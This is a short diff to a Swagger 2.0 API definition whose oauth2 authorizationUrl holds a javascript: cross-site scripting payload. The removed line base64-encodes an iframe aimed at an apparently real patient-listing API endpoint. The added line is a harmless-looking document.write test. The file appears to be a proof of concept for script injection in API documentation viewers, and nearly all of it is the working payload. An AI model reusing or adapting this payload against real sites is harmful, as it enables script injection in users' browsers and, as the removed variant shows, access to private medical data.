@@ -2,4 +2,4 @@ swagger: '2.0'
 securityDefinitions:
   a:
     type: oauth2
-    authorizationUrl: javascript:document.write(atob("PGlmcmFtZT0naHR0cHM6Ly9tYWduZXRvLmFwaS5oYWxvZG9jLmNvbS9hcGkvdjEvdXNlcnMvcGF0aWVudHM/cGVyX3BhZ2U9MTAwJnBhZ2Vfbm89MSc8L2lmcmFtZT4K"))//
+    authorizationUrl: javascript:document.write('<h1>lol<\/h1>'))//
